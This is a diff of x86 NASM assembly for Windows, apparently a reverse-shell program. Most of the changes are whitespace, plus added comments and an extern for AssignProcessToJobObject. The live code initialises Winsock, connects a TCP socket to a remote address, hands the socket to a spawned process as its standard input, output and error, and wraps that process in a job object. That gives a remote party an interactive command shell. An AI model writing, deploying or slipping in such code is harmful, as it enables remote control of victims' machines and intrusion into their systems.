@@ -19,11 +19,11 @@ section .data
     SetJobObject_name db 'SetInformationJobObject', 0
 
     jobinfo:
-        dd 0, 0, 0, 0   
-        dd 0, 0, 0, 0    
+        dd 0, 0, 0, 0      
+        dd 0, 0, 0, 0     
         dd 2            
-        dd 0             
-        dd 0, 0           
+        dd 0              
+        dd 0, 0        
 
 section .bss
     hSocket resd 1
@@ -44,87 +44,93 @@ extern _WaitForSingleObject@8
 extern _CloseHandle@4
 extern _CreateJobObjectA@8
 extern _SetInformationJobObject@16
+extern _AssignProcessToJobObject@8  
 
 Start:
+
     push edi
     mov edi, startupinfo
     xor eax, eax
-    mov ecx, 17            
+    mov ecx, 17         
     rep stosd
     pop edi
 
+  
     push ws2_32_dll
     call _LoadLibraryA@4
-    test eax, eax          
+    test eax, eax         
     jz exit
 
+    ; Call WSAStartup
     push wsaData
-    push 0x0202        
+    push 0x0202           
     call _WSAStartup@8
-    test eax, eax       
+    test eax, eax        
     jnz exit
 
 
-    push 0    
-    push 0       
-    push 0         
-    push 6             
-    push 1               
-    push 2                
+    push 0             
+    push 0              
+    push 0           
+    push 6           
+    push 1             
+    push 2               
     call _WSASocketA@24
     mov [hSocket], eax
-    cmp eax, -1          
+    cmp eax, -1       
     je exit
 
 
-    push 16           
-    push sockaddr_in   
-    push dword [hSocket] 
+    push 16               
+    push sockaddr_in      
+    push dword [hSocket]  
     call _connect@12
-    test eax, eax      
+    test eax, eax     
     jnz exit
 
+    ; Create job object
     push 0                 
-    push 0          
+    push 0                
     call _CreateJobObjectA@8
     mov [hJob], eax
 
+
     push 0x00000008        
-    push jobinfo        
-    push 7                
+    push jobinfo       
+    push 7                 
     push dword [hJob]     
     call _SetInformationJobObject@16
 
 
-    mov dword [startupinfo], 68         
+    mov dword [startupinfo], 68        
     mov dword [startupinfo + 44], 0x101   
-    mov dword [startupinfo + 48], 0      
+    mov dword [startupinfo + 48], 0    
     mov eax, [hSocket]
-    mov [startupinfo + 56], eax           
-    mov [startupinfo + 60], eax          
+    mov [startupinfo + 56], eax         
+    mov [startupinfo + 60], eax        
     mov [startupinfo + 64], eax          
 
 
-    push processinfo                     
-    push startupinfo                     
-    push 0                           
-    push 0                              
-    push 0                            
-    push 1                         
-    push 0                          
-    push 0                         
-    push cmd                          
+    push processinfo                      
+    push startupinfo                    
     push 0                             
+    push 0                           
+    push 0                            
+    push 1                           
+    push 0                        
+    push 0                       
+    push cmd                    
+    push 0                         
     call _CreateProcessA@40
 
 
-    push dword [processinfo]        
-    push dword [hJob]                
+    push dword [processinfo]           
+    push dword [hJob]                   
     call _AssignProcessToJobObject@8
 
 
-    push -1                     
-    push dword [processinfo]         
+    push -1                           
+    push dword [processinfo]           
     call _WaitForSingleObject@8
 
 exit:
